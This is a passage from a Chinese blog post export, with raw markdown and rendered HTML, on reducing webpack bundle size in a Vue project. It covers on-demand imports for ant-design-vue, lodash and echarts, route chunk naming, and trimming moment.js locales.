详述\n\n总的思路就是尽量减小打包文件大小，具体方法就是按需加载，也就是更小颗粒度的去引用需要的功能模块。\n\n## 基础优化\n\n一，组件库按需引入组件：\n\n```js\n// src/main.js\n// babel-plugin-import 会帮助你加载 JS 和 CSS\nimport {\n  Layout,\n  Menu,\n  ...\n} from \"ant-design-vue\";\n```\n\n二，路由中使用“webpackChunkName”:\n\n```js\n// src/router.js\n...\n{\n  path: \"/user/login\",\n  name: \"login\",\n  component: () =>\n    import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n},\n...\n```\n\n三，第三方库按需打包\n如 lodash，可以直接引入具体方法，也可以通过 webpack 插件来按需打包：\n\n`import debounce from \"lodash/debounce\"`或者`import { debounce } from \"lodash\"`+ `babel-plugin-lodash lodash-webpack-plugin`\n\n## 分析打包报告并优化\n\n### 导出报告\n\n```shell\nnpm run build -- --report\n```\n\n示例图如下：\n![初始报告图](report.jpg)\n\n根据该分析报告，可以看出比较大的模块有@ant-design、moment 和 echarts。本次也将以此为例讲解。\n\n### @ant-design 优化\n\n这部分最大的优化点就是 icons 部分，本次讲下社区提供的[优化方案](https://github.com/HeskeyBaozi/reduce-antd-icons-bundle-demo)。\n\n创建 `src/icons.js`\n\n```js\n// 列举你需要的图标\nexport {\n  default as MenuFoldOutline\n} from \"@ant-design/icons/lib/outline/MenuFoldOutline\";\n\nexport {\n  default as MenuUnfoldOutline\n} from \"@ant-design/icons/lib/outline/MenuUnfoldOutline\";\n```\n\n配置 `vue.config.js`\n\n```js\nconfigureWebpack: {\n  resolve: {\n    alias: {\n      \"@ant-design/icons/lib/dist$\": path.resolve(__dirname, \"./src/icons.js\")\n    }\n  }\n},\n```\n\n该方案有个缺点就是你得列举所有用到的图标，包括组件内用到的，目前没发现其他更好的方案。\n\n### moment 优化\n\n针对 locale 语言包部分，本次也以社区提供的[优化方案](https://github.com/jmblog/how-to-optimize-momentjs-with-webpack)为例讲下。\n\n整体思路为两种，一种是先忽略整体语言包，然后业务层面引入特定的语言包文件；另一种是直接指定打包哪些语言文件。主要会用到 webpack 的两个内置插件 `IgnorePlugin` 和 `ContextReplacementPlugin`。\n\n一，IgnorePlugin 的使用\n\n移除所有语言包\n\n```js\n// vue.config.js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // Ignore all locale files of moment.js\n      new webpack.IgnorePlugin(/^\\.\\/locale$/, /moment$/)\n    ]\n  }\n};\n```\n\n在需要的地方引入需要的语言包\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n二，ContextReplacementPlugin 的使用\n\n```js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // load `moment/locale/zh-cn.js`\n      new webpack.ContextReplacementPlugin(/moment[/\\\\]locale$/, /zh-cn/)\n    ]\n  }\n};\n```\n\n这样在你需要的地方就不用单独引入语言包了\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  // import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n### echarts 优化\n\n由整体引入 echarts 包改成按需引入。\n\n```js\n// 整体引入：\nimport echarts from \"echarts\";\n```\n\n```js\n// 按需引入：\n// 核心功能包\nimport echarts from \"echarts/lib/echarts\";\n// 用到的柱状图功能包\nimport \"echarts/lib/chart/bar\";\n// 标题功能包\nimport \"echarts/lib/component/title\";\n```\n\n经过以上三个模块的优化之后，报告图如下：\n![优化后报告图](report1.jpg)\n优化前后大小对比：\n![优化前](size0.jpg)\n![优化后](size1.jpg)\n\n## webpack 性能优化——DLL\n\nhttps://www.cnblogs.com/ghost-xyx/p/6472578.html\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-bundle.md","raw":"---\ntitle: Vue实战@高效的构建打包发布\npermalink: vue-in-action-bundle\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-29 07:28:59\nupdated: 2019-05-29 07:28:59\n---\n\n# 概述\n\n本文主要是针对 vue 项目的 webpack 打包文件大小优化相关讲解。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n总的思路就是尽量减小打包文件大小，具体方法就是按需加载，也就是更小颗粒度的去引用需要的功能模块。\n\n## 基础优化\n\n一，组件库按需引入组件：\n\n```js\n// src/main.js\n// babel-plugin-import 会帮助你加载 JS 和 CSS\nimport {\n  Layout,\n  Menu,\n  ...\n} from \"ant-design-vue\";\n```\n\n二，路由中使用“webpackChunkName”:\n\n```js\n// src/router.js\n...\n{\n  path: \"/user/login\",\n  name: \"login\",\n  component: () =>\n    import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n},\n...\n```\n\n三，第三方库按需打包\n如 lodash，可以直接引入具体方法，也可以通过 webpack 插件来按需打包：\n\n`import debounce from \"lodash/debounce\"`或者`import { debounce } from \"lodash\"`+ `babel-plugin-lodash lodash-webpack-plugin`\n\n## 分析打包报告并优化\n\n### 导出报告\n\n```shell\nnpm run build -- --report\n```\n\n示例图如下：\n![初始报告图](report.jpg)\n\n根据该分析报告，可以看出比较大的模块有@ant-design、moment 和 echarts。本次也将以此为例讲解。\n\n### @ant-design 优化\n\n这部分最大的优化点就是 icons 部分，本次讲下社区提供的[优化方案](https://github.com/HeskeyBaozi/reduce-antd-icons-bundle-demo)。\n\n创建 `src/icons.js`\n\n```js\n// 列举你需要的图标\nexport {\n  default as MenuFoldOutline\n} from \"@ant-design/icons/lib/outline/MenuFoldOutline\";\n\nexport {\n  default as MenuUnfoldOutline\n} from \"@ant-design/icons/lib/outline/MenuUnfoldOutline\";\n```\n\n配置 `vue.config.js`\n\n```js\nconfigureWebpack: {\n  resolve: {\n    alias: {\n      \"@ant-design/icons/lib/dist$\": path.resolve(__dirname, \"./src/icons.js\")\n    }\n  }\n},\n```\n\n该方案有个缺点就是你得列举所有用到的图标，包括组件内用到的，目前没发现其他更好的方案。\n\n### moment 优化\n\n针对 locale 语言包部分，本次也以社区提供的[优化方案](https://github.com/jmblog/how-to-optimize-momentjs-with-webpack)为例讲下。\n\n整体思路为两种，一种是先忽略整体语言包，然后业务层面引入特定的语言包文件；另一种是直接指定打包哪些语言文件。主要会用到 webpack 的两个内置插件 `IgnorePlugin` 和 `ContextReplacementPlugin`。\n\n一，IgnorePlugin 的使用\n\n移除所有语言包\n\n```js\n// vue.config.js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // Ignore all locale files of moment.js\n      new webpack.IgnorePlugin(/^\\.\\/locale$/, /moment$/)\n    ]\n  }\n};\n```\n\n在需要的地方引入需要的语言包\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n二，ContextReplacementPlugin 的使用\n\n```js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // load `moment/locale/zh-cn.js`\n      new webpack.ContextReplacementPlugin(/moment[/\\\\]locale$/, /zh-cn/)\n    ]\n  }\n};\n```\n\n这样在你需要的地方就不用单独引入语言包了\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  // import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n### echarts 优化\n\n由整体引入 echarts 包改成按需引入。\n\n```js\n// 整体引入：\nimport echarts from \"echarts\";\n```\n\n```js\n// 按需引入：\n// 核心功能包\nimport echarts from \"echarts/lib/echarts\";\n// 用到的柱状图功能包\nimport \"echarts/lib/chart/bar\";\n// 标题功能包\nimport \"echarts/lib/component/title\";\n```\n\n经过以上三个模块的优化之后，报告图如下：\n![优化后报告图](report1.jpg)\n优化前后大小对比：\n![优化前](size0.jpg)\n![优化后](size1.jpg)\n\n## webpack 性能优化——DLL\n\nhttps://www.cnblogs.com/ghost-xyx/p/6472578.html\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-bundle","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xo006nwovvn8upgt75","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文主要是针对 vue 项目的 webpack 打包文件大小优化相关讲解。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>总的思路就是尽量减小打包文件大小，具体方法就是按需加载，也就是更小颗粒度的去引用需要的功能模块。</p>\n<h2 id=\"基础优化\"><a href=\"#基础优化\" class=\"headerlink\" title=\"基础优化\"></a>基础优化</h2><p>一，组件库按需引入组件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/main.js</span></span><br><span class=\"line\"><span class=\"comment\">// babel-plugin-import 会帮助你加载 JS 和 CSS</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">  Layout,</span><br><span class=\"line\">  Menu,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br></pre></td></tr></table></figure>\n<p>二，路由中使用“webpackChunkName”:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/router.js</span></span><br><span class=\"line\">...</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">  name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>三，第三方库按需打包<br>如 lodash，可以直接引入具体方法，也可以通过 webpack 插件来按需打包：</p>\n<p><code>import debounce from &quot;lodash/debounce&quot;</code>或者<code>import { debounce } from &quot;lodash&quot;</code>+ <code>babel-plugin-lodash lodash-webpack-plugin</code></p>\n<h2 id=\"分析打包报告并优化\"><a href=\"#分析打包报告并优化\" class=\"headerlink\" title=\"分析打包报告并优化\"></a>分析打包报告并优化</h2><h3 id=\"导出报告\"><a href=\"#导出报告\" class=\"headerlink\" title=\"导出报告\"></a>导出报告</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build -- --report</span><br></pre></td></tr></table></figure>\n<p>示例图如下：<br><img src=\"/vue-in-action-bundle/report.jpg\" alt=\"初始报告图\"></p>\n<p>根据该分析报告，可以看出比较大的模块有@ant-design、moment 和 echarts。本次也将以此为例讲解。</p>\n<h3 id=\"ant-design-优化\"><a href=\"#ant-design-优化\" class=\"headerlink\" title=\"@ant-design 优化\"></a>@ant-design 优化</h3><p>这部分最大的优化点就是 icons 部分，本次讲下社区提供的<a href=\"https://github.com/HeskeyBaozi/reduce-antd-icons-bundle-demo\" target=\"_blank\" rel=\"noopener\">优化方案</a>。</p>\n<p>创建 <code>src/icons.js</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 列举你需要的图标</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> <span class=\"keyword\">as</span> MenuFoldOutline</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"@ant-design/icons/lib/outline/MenuFoldOutline\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> <span class=\"keyword\">as</span> MenuUnfoldOutline</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"@ant-design/icons/lib/outline/MenuUnfoldOutline\"</span>;</span><br></pre></td></tr></table></figure>\n<p>配置 <code>vue.config.js</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configureWebpack: &#123;</span><br><span class=\"line\">  resolve: &#123;</span><br><span class=\"line\">    alias: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"@ant-design/icons/lib/dist$\"</span>: path.resolve(__dirname, <span class=\"string\">\"./src/icons.js\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<p>该方案有个缺点就是你得列举所有用到的图标，包括组件内用到的，目前没发现其他更好的方案。</p>\n<h3 id=\"moment-优化\"><a href=\"#moment-优化\" class=\"headerlink\" title=\"moment 优化\"></a>moment 优化</h3><p>针对 locale 语言包部分，本次也以社区提供的<a href=\"https://github.com/jmblog/how-to-optimize-momentjs-with-webpack\" target=\"_blank\" rel=\"noopener\">优化方案</a>为例讲下。</p>\n<p>整体思路为两种，一种是先忽略整体语言包，然后业务层面引入特定的语言包文件；另一种是直接指定打包哪些语言文件。主要会用到 webpack 的两个内置插件 <code>IgnorePlugin</code> 和 <code>ContextReplacementPlugin</code>。</p>\n<p>一，IgnorePlugin 的使用</p>\n<p>移除所有语言包</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// vue.config.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">\"webpack\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  configureWebpack: &#123;</span><br><span class=\"line\">    plugins: [</span><br><span class=\"line\">      <span class=\"comment\">// Ignore all locale files of moment.js</span></span><br><span class=\"line\">      <span class=\"keyword\">new</span> webpack.IgnorePlugin(<span class=\"regexp\">/^\\.\\/locale$/</span>, /moment$/)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>在需要的地方引入需要的语言包</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> <span class=\"string\">\"moment/locale/zh-cn\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>二，ContextReplacementPlugin 的使用</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">\"webpack\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  configureWebpack: &#123;</span><br><span class=\"line\">    plugins: [</span><br><span class=\"line\">      <span class=\"comment\">// load `moment/locale/zh-cn.js`</span></span><br><span class=\"line\">      <span class=\"keyword\">new</span> webpack.ContextReplacementPlugin(<span class=\"regexp\">/moment[/\\\\]locale$/</span>, /zh-cn/)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这样在你需要的地方就不用单独引入语言包了</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"comment\">// import \"moment/locale/zh-cn\";</span></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"echarts-优化\"><a href=\"#echarts-优化\" class=\"headerlink\" title=\"echarts 优化\"></a>echarts 优化</h3><p>由整体引入 echarts 包改成按需引入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 整体引入：</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 按需引入：</span></span><br><span class=\"line\"><span class=\"comment\">// 核心功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts/lib/echarts\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 用到的柱状图功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"echarts/lib/chart/bar\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 标题功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"echarts/lib/component/title\"</span>;</span><br></pre></td></tr></table></figure>\n<p>经过以上三个模块的优化之后，报告图如下：<br><img src=\"/vue-in-action-bundle/report1.jpg\" alt=\"优化后报告图\"><br>优化前后大小对比：<br><img src=\"/vue-in-action-bundle/size0.jpg\" alt=\"优化前\"><br><img src=\"/vue-in-action-bundle/size1.jpg\" alt=\"优化后\"></p>\n<h2 id=\"webpack-性能优化——DLL\"><a href=\"#webpack-性能优化——DLL\" class=\"headerlink\" title=\"webpack 性能优化——DLL\"></a>webpack 性能优化——DLL</h2><p><a href=\"https://www.cnblogs.com/ghost-xyx/p/6472578.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ghost-xyx/p/6472578.html</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文主要是针对 vue 项目的 webpack 打包文件大小优化相关讲解。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>总的思路就是尽量减小打包文件大小，具体方法就是按需加载，也就是更小颗粒度的去引用需要的功能模块。</p>\n<h2 id=\"基础优化\"><a href=\"#基础优化\" class=\"headerlink\" title=\"基础优化\"></a>基础优化</h2><p>一，组件库按需引入组件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/main.js</span></span><br><span class=\"line\"><span class=\"comment\">// babel-plugin-import 会帮助你加载 JS 和 CSS</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">  Layout,</span><br><span class=\"line\">  Menu,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br></pre></td></tr></table></figure>\n<p>二，路由中使用“webpackChunkName”:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/router.js</span></span><br><span class=\"line\">...</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">  name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>三，第三方库按需打包<br>如 lodash，可以直接引入具体方法，也可以通过 webpack 插件来按需打包：</p>\n<p><code>import debounce from &quot;lodash/debounce&quot;</code>或者<code>import { debounce } from &quot;lodash&quot;</code>+ <code>babel-plugin-lodash lodash-webpack-plugin</code></p>\n<h2 id=\"分析打包报告并优化\"><a href=\"#分析打包报告并优化\" class=\"headerlink\" title=\"分析打包报告并优化\"></a>分析打包报告并优化</h2><h3 id=\"导出报告\"><a href=\"#导出报告\" class=\"headerlink\" title=\"导出报告\"></a>导出报告</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build -- --report</span><br></pre></td></tr></table></figure>\n<p>示例图如下：<br><img src=\"/vue-in-action-bundle/report.jpg\" alt=\"初始报告图\"></p>\n<p>根据该分析报告，可以看出比较大的模块有@ant-design、moment 和 echarts。本次也将以此为例讲解。</p>\n<h3 id=\"ant-design-优化\"><a href=\"#ant-design-优化\" class=\"headerlink\" title=\"@ant-design 优化\"></a>@ant-design 优化</h3><p>这部分最大的优化点就是 icons 部分，本次讲下社区提供的<a href=\"https://github.com/HeskeyBaozi/reduce-antd-icons-bundle-demo\" target=\"_blank\" rel=\"noopener\">优化方案</a>。</p>\n<p>创建 <code>src/icons.js</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 列举你需要的图标</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> <span class=\"keyword\">as</span> MenuFoldOutline</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"@ant-design/icons/lib/outline/MenuFoldOutline\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> <span class=\"keyword\">as</span> MenuUnfoldOutline</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">\"@ant-design/icons/lib/outline/MenuUnfoldOutline\"</span>;</span><br></pre></td></tr></table></figure>\n<p>配置 <code>vue.config.js</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configureWebpack: &#123;</span><br><span class=\"line\">  resolve: &#123;</span><br><span class=\"line\">    alias: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"@ant-design/icons/lib/dist$\"</span>: path.resolve(__dirname, <span class=\"string\">\"./src/icons.js\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<p>该方案有个缺点就是你得列举所有用到的图标，包括组件内用到的，目前没发现其他更好的方案。</p>\n<h3 id=\"moment-优化\"><a href=\"#moment-优化\" class=\"headerlink\" title=\"moment 优化\"></a>moment 优化</h3><p>针对 locale 语言包部分，本次也以社区提供的<a href=\"https://github.com/jmblog/how-to-optimize-momentjs-with-webpack\" target=\"_blank\" 